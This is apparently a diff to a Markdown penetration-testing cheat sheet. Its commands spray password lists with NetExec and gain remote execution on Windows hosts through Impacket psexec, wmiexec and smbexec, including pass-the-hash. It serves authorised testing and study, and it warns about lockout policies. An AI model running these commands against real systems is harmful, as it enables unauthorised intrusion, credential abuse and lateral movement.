@@ -10,7 +10,7 @@ Use the account's actual authority. A successful login does not establish admini
 
 ```bash
 # Domain account
-nxc smb {{RHOST}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}'
+nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}'
 # Local account
 nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' --local-auth
 ```
@@ -19,21 +19,26 @@ nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' --local-auth
 
 ## Reuse one known credential
 
-- [ ] Check [password policy](active-directory/ad-enumeration#password-policy) before repeated attempts.
+- [ ] Check [password policy](active-directory/ad-enumeration#password-policy-and-kerberos-controls) before repeated attempts.
 - [ ] Test one intended host and service; record authority, result and actual access.
-- [ ] Read [SMB shares](services/common-services#smb) and [remote access](services/remote-access#winrm) with the permissions obtained.
+- [ ] Read [SMB shares](services/common-services#smb) and [remote access](services/remote-access#winrm-checks-and-shell) with the permissions obtained.
 
 [Lockout considerations](https://www.netexec.wiki/smb-protocol/password-spraying).
 
-## Remote Windows command
+## Remote execution
 
-Requires administrative access and a working remote execution method. Verify the resulting identity.
+Requires administrative access and a working remote execution method. Verify the resulting identity before treating access as proof.
 
 ```bash
-nxc smb {{RHOST}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -x whoami
+# NetExec SMB command
+nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' -x whoami
+# Impacket execution
+impacket-psexec '{{USER}}:{{PASS}}'@{{RHOST}}
+impacket-wmiexec '{{USER}}:{{PASS}}'@{{RHOST}}
+impacket-smbexec '{{USER}}:{{PASS}}'@{{RHOST}}
 ```
 
-NetExec's admin indicator is a lead; check the command result itself. [Source](https://www.netexec.wiki/smb-protocol/command-execution/execute-remote-command).
+Use the method that matches the host and recovered credential. NetExec's admin indicator is a lead; check the command result itself. [NetExec execution](https://www.netexec.wiki/smb-protocol/command-execution/execute-remote-command), [Impacket examples](https://github.com/fortra/impacket/tree/master/examples).
 
 ## Kerberos authentication
 
@@ -47,11 +52,11 @@ Check [DNS and time](active-directory/kerberos#kerberos-dns-or-clock-failure) fi
 
 ## Password spraying
 
-Spray harvested lists against one service at a time. Check the [password policy](active-directory/ad-enumeration#password-policy) for a lockout threshold first. users.txt and passwords.txt hold one value per line on Kali. Repeat per target box, emptying cracked pairs between rounds.
+Spray harvested lists against one service at a time. Check the [password policy](active-directory/ad-enumeration#password-policy-and-kerberos-controls) for a lockout threshold first. users.txt and passwords.txt hold one value per line on Kali. Repeat per target box, emptying cracked pairs between rounds.
 
 ```bash
-nxc smb {{RHOST}} -u users.txt -p passwords.txt -d '{{DOMAIN}}' --continue-on-success
-nxc winrm {{RHOST}} -u users.txt -p passwords.txt -d '{{DOMAIN}}' --continue-on-success
+nxc smb {{RHOST}} -u users.txt -p passwords.txt --continue-on-success
+nxc winrm {{RHOST}} -u users.txt -p passwords.txt --continue-on-success
 ```
 
 `(Pwn3d!)` or `STATUS_SUCCESS` marks a working pair. [NetExec SMB authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain).
@@ -63,6 +68,7 @@ Replay an NT hash where a password would otherwise go. Set NTHASH to the hash af
 ```bash
 impacket-psexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
 impacket-wmiexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
+impacket-smbexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
 ```
 
 Requires administrator on the target; a domain-admin hash reaches the controller directly. Verify the resulting identity. [Impacket examples](https://github.com/fortra/impacket/tree/master/examples).
